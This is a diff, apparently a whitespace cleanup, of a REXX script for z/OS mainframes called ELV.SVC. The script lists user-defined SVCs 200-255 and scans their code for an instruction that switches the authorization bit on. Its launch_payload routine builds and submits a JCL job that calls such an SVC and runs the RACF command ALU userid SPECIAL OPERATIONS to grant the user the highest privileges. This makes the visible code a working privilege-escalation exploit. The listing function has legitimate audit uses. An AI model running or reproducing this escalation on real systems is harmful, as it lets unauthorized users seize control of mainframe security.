@@ -3,7 +3,7 @@
 /****************************************************************************/
 /*  ELV.SVC is a tool to list check for MAGIC SVC or AUTH SVC               */
 /*  an AUTH SVC, is a user defined SVC (n>200) that sets the                */
-/*  authorization bit ON.                                                   */  
+/*  authorization bit ON.                                                   */
 /*  Used by some products or admins to easily get high privileges.          */
 /*                                                                          */
 /*  Usage : ex 'ELV.SVC'  'LIST'                                            */
@@ -32,7 +32,7 @@ if (translate(parm1) = "LIST") then
   DO
     Call SVC
     exit
-  END 
+  END
 
 if parm1 <> "DSN" & parm2 <> "NUM" then do
     say "Usage: ex 'ELV.SVC' 'LIST' to check for magic SVC"
@@ -68,7 +68,7 @@ if svc_reg > 16 & length(svc_reg_v) <> 0 then
     exit
   End
 
-  
+
 say "Loading" svc_reg_v "into" svc_reg
 say "then using SVC" svc_num " to get Auth"
 
@@ -77,52 +77,52 @@ launch_payload(svc_num, svc_reg,svc_reg_v,dsn)
 exit
 
 /**
- ** SVC information sub-routine                                       
+ ** SVC information sub-routine
 **/
 
 SVC:
 
-CVT      = C2d(Storage(10,4))                /* point to CVT         */         
-CVTFLAG2 = Storage(D2x(CVT+377),1)           /* CVT flag byte 2      */         
-CVTEXT2  = C2d(Storage(D2x(CVT + 328),4))    /* point to CVTEXT2     */                                                                                  
+CVT      = C2d(Storage(10,4))                /* point to CVT         */
+CVTFLAG2 = Storage(D2x(CVT+377),1)           /* CVT flag byte 2      */
+CVTEXT2  = C2d(Storage(D2x(CVT + 328),4))    /* point to CVTEXT2     */
 
-CVTABEND  = C2d(Storage(D2x(CVT+200),4))     /* point to CVTABEND    */         
-SCVT      = CVTABEND        /* this is the SCVT -  mapped by IHASCVT */         
-SCVTSVCT  = C2d(Storage(D2x(SCVT+132),4))    /* point to SVCTABLE    */         
+CVTABEND  = C2d(Storage(D2x(CVT+200),4))     /* point to CVTABEND    */
+SCVT      = CVTABEND        /* this is the SCVT -  mapped by IHASCVT */
+SCVTSVCT  = C2d(Storage(D2x(SCVT+132),4))    /* point to SVCTABLE    */
 SCVTSVCR  = C2d(Storage(D2x(SCVT+136),4))    /* point to SVC UPD TBL */
-svc_auth.0    = 0   /* total number of auth SVC                      */         
+svc_auth.0    = 0   /* total number of auth SVC                      */
 
 /**
  ** Standard SVC table display loop
 **/
 
-say '     '                                                                   
-say 'Custom defined SVC:'                                                              
-say '  Num Hex  EP-Addr  AM TYP APF ASF AR NP UP' ,             
-      'CNT AUTH-BIT'                                                      
-Do SVCLST = 200 to 255                                                            
-  SVCTENT  = Storage(D2x(SCVTSVCT+(SVCLST*8)),8)  /* SVC Table Entry */         
-  SVCTENTU = Storage(D2x(SCVTSVCR+(SVCLST*24)),24) /* SVC UP TBL ENT */         
-  SVCURCNT = C2d(Substr(SVCTENTU,21,2))      /* SVC update count     */         
-  SVCAMODE = Substr(SVCTENT,1,1)             /* AMODE indicator      */         
-  SVCEPA   = Substr(SVCTENT,1,4)             /* Entry point addr     */         
-  SVCEPAR  = C2x(SVCEPA)                     /* EPA - readable       */         
-  SVCEPAR  = Right(SVCEPAR,8,'0')            /* ensure leading zeros */         
-  SVCATTR1 = Substr(SVCTENT,5,1)             /* SVC attributes       */         
-  SVCATTR3 = Substr(SVCTENT,6,1)             /* SVC attributes       */         
-  SVCLOCKS = Substr(SVCTENT,7,1)             /* Lock attributes      */         
-  
+say '     '
+say 'Custom defined SVC:'
+say '  Num Hex  EP-Addr  AM TYP APF ASF AR NP UP' ,
+      'CNT AUTH-BIT'
+Do SVCLST = 200 to 255
+  SVCTENT  = Storage(D2x(SCVTSVCT+(SVCLST*8)),8)  /* SVC Table Entry */
+  SVCTENTU = Storage(D2x(SCVTSVCR+(SVCLST*24)),24) /* SVC UP TBL ENT */
+  SVCURCNT = C2d(Substr(SVCTENTU,21,2))      /* SVC update count     */
+  SVCAMODE = Substr(SVCTENT,1,1)             /* AMODE indicator      */
+  SVCEPA   = Substr(SVCTENT,1,4)             /* Entry point addr     */
+  SVCEPAR  = C2x(SVCEPA)                     /* EPA - readable       */
+  SVCEPAR  = Right(SVCEPAR,8,'0')            /* ensure leading zeros */
+  SVCATTR1 = Substr(SVCTENT,5,1)             /* SVC attributes       */
+  SVCATTR3 = Substr(SVCTENT,6,1)             /* SVC attributes       */
+  SVCLOCKS = Substr(SVCTENT,7,1)             /* Lock attributes      */
+
   not_used = 0
   do k = 0 to SVCLST
     if SVCEPAR == svc_list.k then do
-        not_used = 1        
+        not_used = 1
     end
   end
-  
-  if not_used == 0 then do 
+
+  if not_used == 0 then do
     svc_list.SVCLST = SVCEPAR
   end
-  
+
   /* Check the code for any bit flip grantint SPECIAL */
   /****************************************************/
   call check_auth  SVCEPA
@@ -132,51 +132,51 @@ Do SVCLST = 200 to 255
         svc_auth.0 = svc_auth.0 + 1
         svc_auth.SVCLST = SVCEPA
     End
-  
-  /*  Check amode           */                                                  
-  /**************************/                                                  
-  If Bitand(SVCAMODE,'80'x) = '80'x then SVC_AMODE = '31'                       
-    Else SVC_AMODE = '24'                                                       
-  
-  
-  /*  Check SVC type flag   */                                                  
-  /**************************/                                                  
-  Select                                     /* determine SVC type   */         
-    When Bitand(SVCATTR1,'C0'x) = 'C0'x then SVCTYPE = '3/4'                    
-    When Bitand(SVCATTR1,'80'x) = '80'x then SVCTYPE = ' 2 '                    
-    When Bitand(SVCATTR1,'20'x) = '20'x then SVCTYPE = ' 6 '                    
-    When Bitand(SVCATTR1,'00'x) = '00'x then SVCTYPE = ' 1 '                    
-    Otherwise SVCTYPE = '???'                                                   
-  End /* select */                                                              
-  
-  
-  /*  Check other SVC flags */                                                  
-  /**************************/                                                  
-  SVCAPF = '   ' ; SVCESR = '   ' ; SVCNP = '  '  /* init as blanks  */         
-  SVCASF = '   ' ; SVCAR  = '  '  ; SVCUP = '  '  /* init as blanks  */         
-  If Bitand(SVCATTR1,'08'x) = '08'x then SVCAPF  = 'APF'                        
-  If Bitand(SVCATTR1,'04'x) = '04'x then SVCESR  = 'ESR'                        
-  If Bitand(SVCATTR1,'02'x) = '02'x then SVCNP   = 'NP'                         
-  If Bitand(SVCATTR1,'01'x) = '01'x then SVCASF  = 'ASF'                        
-  If Bitand(SVCATTR3,'80'x) = '80'x then SVCAR   = 'AR'                         
-  If SVCURCNT <> 0 then SVCUP = 'UP'   /* this SVC has been updated  */         
-  If SVCURCNT = 0 then do              /* svc never updated          */         
-    SVCURCNT = '   '                                                            
-  End                                                                           
-  Else do /* most, if not all UP nums are sngl digit- center display */         
-   If SVCURCNT < 10 then SVCURCNT = Right(SVCURCNT,2,' ') || ' '                
-     Else SVCURCNT = Right(SVCURCNT,3,' ')                                      
-  End /* else do */                                                             
-                                                                                    
-  If not_used == 1 then do                   /* this SVC is not used */         
+
+  /*  Check amode           */
+  /**************************/
+  If Bitand(SVCAMODE,'80'x) = '80'x then SVC_AMODE = '31'
+    Else SVC_AMODE = '24'
+
+
+  /*  Check SVC type flag   */
+  /**************************/
+  Select                                     /* determine SVC type   */
+    When Bitand(SVCATTR1,'C0'x) = 'C0'x then SVCTYPE = '3/4'
+    When Bitand(SVCATTR1,'80'x) = '80'x then SVCTYPE = ' 2 '
+    When Bitand(SVCATTR1,'20'x) = '20'x then SVCTYPE = ' 6 '
+    When Bitand(SVCATTR1,'00'x) = '00'x then SVCTYPE = ' 1 '
+    Otherwise SVCTYPE = '???'
+  End /* select */
+
+
+  /*  Check other SVC flags */
+  /**************************/
+  SVCAPF = '   ' ; SVCESR = '   ' ; SVCNP = '  '  /* init as blanks  */
+  SVCASF = '   ' ; SVCAR  = '  '  ; SVCUP = '  '  /* init as blanks  */
+  If Bitand(SVCATTR1,'08'x) = '08'x then SVCAPF  = 'APF'
+  If Bitand(SVCATTR1,'04'x) = '04'x then SVCESR  = 'ESR'
+  If Bitand(SVCATTR1,'02'x) = '02'x then SVCNP   = 'NP'
+  If Bitand(SVCATTR1,'01'x) = '01'x then SVCASF  = 'ASF'
+  If Bitand(SVCATTR3,'80'x) = '80'x then SVCAR   = 'AR'
+  If SVCURCNT <> 0 then SVCUP = 'UP'   /* this SVC has been updated  */
+  If SVCURCNT = 0 then do              /* svc never updated          */
+    SVCURCNT = '   '
+  End
+  Else do /* most, if not all UP nums are sngl digit- center display */
+   If SVCURCNT < 10 then SVCURCNT = Right(SVCURCNT,2,' ') || ' '
+     Else SVCURCNT = Right(SVCURCNT,3,' ')
+  End /* else do */
+
+  If not_used == 1 then do                   /* this SVC is not used */
     iterate
   End
-                                                                                
-  say ' '  Right(SVCLST,3,' ') '('Right(D2x(SVCLST),2,0)')' ,                 
-    SVCEPAR SVC_AMODE SVCTYPE SVCAPF SVCASF ,                     
-    SVCAR SVCNP SVCUP SVCURCNT auth_bit                                       
-    
-End /* Do SVCLST = 0 to 255 */                                                  
+
+  say ' '  Right(SVCLST,3,' ') '('Right(D2x(SVCLST),2,0)')' ,
+    SVCEPAR SVC_AMODE SVCTYPE SVCAPF SVCASF ,
+    SVCAR SVCNP SVCUP SVCURCNT auth_bit
+
+End /* Do SVCLST = 0 to 255 */
 
 
 Do i=200 to 255
@@ -191,7 +191,7 @@ End
 
 
 
-Return                                                                          
+Return
 
 
 /**
@@ -218,10 +218,10 @@ MAX = 1000
 string =  C2X(Storage(C2X(svc_addr),MAX))
 
 return patmatch(flip_auth_op,string)
-           
+
 
 /**
- ** Closest I found to a REGEX function in REXX 
+ ** Closest I found to a REGEX function in REXX
 **/
 
 patmatch: PROCEDURE EXPOSE gbl.
@@ -288,8 +288,8 @@ launch_payload:
     svc_reg = arg(2)
     svc_reg_v = arg(3)
     dsn = arg(4)
-    
-    PROG = rand_char(6)    
+
+    PROG = rand_char(6)
     say "Compiling " PROG "in" dsn
     QUEUE "//CMPSVC1 JOB (JOBNAME),'XSS',CLASS=A,NOTIFY=&SYSUID"
     QUEUE "//*"
@@ -328,7 +328,7 @@ launch_payload:
     if length(svc_reg) <> 0  then
       Do
          QUEUE "PARAM  DC  X'"||svc_reg_v||"'   "
-      End    
+      End
     QUEUE "       END"
     QUEUE "/*"
     QUEUE "//L.SYSLMOD DD DISP=SHR,DSN="||dsn||""
@@ -342,13 +342,13 @@ launch_payload:
     QUEUE " ALU "||userid()||" SPECIAL OPERATIONS"
     QUEUE "/*"
     QUEUE "//SYSIN   DD DUMMY"
-    QUEUE "//SYSTSPRT DD SYSOUT=*"    
+    QUEUE "//SYSTSPRT DD SYSOUT=*"
     QUEUE "//*"
     QUEUE "$$"
-    
-    o = OUTTRAP("output.",,"CONCAT")       
+
+    o = OUTTRAP("output.",,"CONCAT")
     address tso "SUBMIT * END($$)"
-    o = OUTTRAP(OFF) 
+    o = OUTTRAP(OFF)
 
     exit(0)
 
